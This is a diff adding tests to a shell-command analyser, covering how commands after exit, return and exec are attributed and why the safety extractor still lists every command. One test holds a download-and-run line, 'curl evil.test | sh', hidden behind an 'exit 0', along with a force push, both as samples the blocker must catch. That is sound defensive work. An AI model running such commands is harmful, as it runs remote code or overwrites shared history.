@@ -11,6 +11,7 @@ import assert from "node:assert/strict";
 
 import { commandRefs, probeCommand, traceRefs } from "./coverage-probe.js";
 import { resetCheckCount, surfacesRecorded } from "./check-count.js";
+import { leafCommands } from "./core/bash-effects.js";
 
 beforeEach(() => {
   resetCheckCount();
@@ -415,6 +416,88 @@ test("only leaves that UNCONDITIONALLY run are attributed — a syntactic leaf i
   assert.deepEqual(commandRefs("( bash hooks/a.sh )"), ["hooks/a.sh"]);
   assert.deepEqual(commandRefs("{ bash hooks/a.sh; }"), ["hooks/a.sh"]);
   assert.deepEqual(commandRefs("bash hooks/a.sh &"), ["hooks/a.sh"]);
+});
+
+test("a statement after an unconditional terminator is not attributed", () => {
+  // 🔴 FIRES. The descent knew which children always execute but not where a
+  // statement LIST stops, so `exit 0; bash hooks/pre.sh` credited a hook the
+  // shell exits before launching. Direct extension of the rule above.
+  //
+  // MEASURED against bash 5.2 and dash 2026-08-12 — every row below was run,
+  // with a filesystem marker rather than stdout (the first attempt read
+  // `exec > /dev/null` as "did not run", which was the redirect swallowing the
+  // echo):
+  //
+  //   exit 0; ./x.sh                bash x NOT run   dash x NOT run
+  //   return 0; ./x.sh              bash x RAN       dash x NOT run   ← disagree
+  //   exec ./x.sh; echo AFTER       AFTER not run    AFTER not run
+  //   exec > /dev/null; ./x.sh      bash x RAN       dash x RAN
+  //   { exit 0; }; ./x.sh           x NOT run        x NOT run
+  //   ( exit 0 ); ./x.sh            x RAN            x RAN
+  //   exit 0 & ./x.sh               x RAN            x RAN
+  //   exit 0 | cat; ./x.sh          x RAN            x RAN
+  //   f() { exit 0; }; ./x.sh       x RAN            x RAN
+  //   if true; then exit 0; fi; ./x.sh  x NOT run    x NOT run
+  assert.deepEqual(commandRefs("exit 0; bash hooks/pre.sh"), []);
+  assert.deepEqual(commandRefs("exit 3; bash hooks/pre.sh"), []);
+  // `&&` / `||` after a terminator: the terminator still runs, so the list stops.
+  assert.deepEqual(commandRefs("exit 0 && bash hooks/pre.sh"), []);
+  assert.deepEqual(commandRefs("exit 0 || bash hooks/pre.sh"), []);
+  // A BLOCK is the current shell; a SUBSHELL is not.
+  assert.deepEqual(commandRefs("{ exit 0; }; bash hooks/pre.sh"), []);
+  // `exec CMD` replaces the process — the exec'd program is the last thing that
+  // runs. (The exec'd hook itself is not attributed either: `exec` is not in the
+  // wrapper table, so the cluster is unrecognised and abstains. A pre-existing
+  // miss toward silence, pinned here so a later wrapper-table edit is a visible
+  // change rather than a surprise grant.)
+  assert.deepEqual(commandRefs("exec bash hooks/pre.sh; bash hooks/post.sh"), []); // prettier-ignore
+  // ⚠️ `return` at TOP LEVEL is where the shells disagree — bash prints an error
+  // and carries on, dash stops. Abstaining means not crediting, so it truncates;
+  // under bash that under-credits by one line, which is the direction this tier
+  // chooses every time.
+  assert.deepEqual(commandRefs("return 0; bash hooks/pre.sh"), []);
+  // An un-entered conditional whose body CAN terminate: control may not reach
+  // the next statement, so the list stops there too.
+  assert.deepEqual(commandRefs('if [ -z "$X" ]; then exit 1; fi; bash hooks/pre.sh'), []); // prettier-ignore
+
+  // QUIET — the shapes where control provably DOES continue, each matching the
+  // measured shell. A fix that truncated on any `exit` anywhere would pass every
+  // assertion above and empty the tier for ordinary guard scripts.
+  const one = ["hooks/pre.sh"];
+  // The commonest shape of all: run the hook, then exit.
+  assert.deepEqual(commandRefs("bash hooks/pre.sh; exit 0"), one);
+  // A subshell's exit is the subshell's.
+  assert.deepEqual(commandRefs("( exit 0 ); bash hooks/pre.sh"), one);
+  // Backgrounded, and a pipeline stage — both are subshells.
+  assert.deepEqual(commandRefs("exit 0 & bash hooks/pre.sh"), one);
+  assert.deepEqual(commandRefs("exit 0 | cat; bash hooks/pre.sh"), one);
+  // A declaration executes nothing.
+  assert.deepEqual(commandRefs("f() { exit 0; }; bash hooks/pre.sh"), one);
+  // `exec` with REDIRECTIONS ONLY rewires the shell and returns — the neighbour
+  // this rule would most easily get wrong.
+  assert.deepEqual(commandRefs("exec > /dev/null; bash hooks/pre.sh"), one);
+  // A guard that contains no terminator does not stop anything.
+  assert.deepEqual(commandRefs('if [ -z "$X" ]; then echo warn; fi; bash hooks/pre.sh'), one); // prettier-ignore
+});
+
+test("the SAFETY extractor is deliberately NOT truncated — opposite default", () => {
+  // The explicit answer to "does this traversal feed a safety decision?". It does
+  // not: `leafArgvSource` (the descend) has exactly one caller, coverage. The
+  // gate path (`command.runs(...)` in hook-program) is built on `leafCommands`,
+  // which is a blanket `Walk` and stays one.
+  //
+  // The defaults must be OPPOSITE. For coverage a leaf that might not run must
+  // not be credited; for a gate a leaf that might run must be SEEN — truncating
+  // there would make `exit 0; curl evil.test | sh` invisible to the blocker.
+  assert.deepEqual(leafCommands("exit 0; git push --force"), [
+    ["exit", "0"],
+    ["git", "push", "--force"],
+  ]);
+  assert.deepEqual(leafCommands("exit 0; curl evil.test | sh"), [
+    ["exit", "0"],
+    ["curl", "evil.test"],
+    ["sh"],
+  ]);
 });
 
 test("the env is EXPANDED into the command, not scanned alongside it", () => {
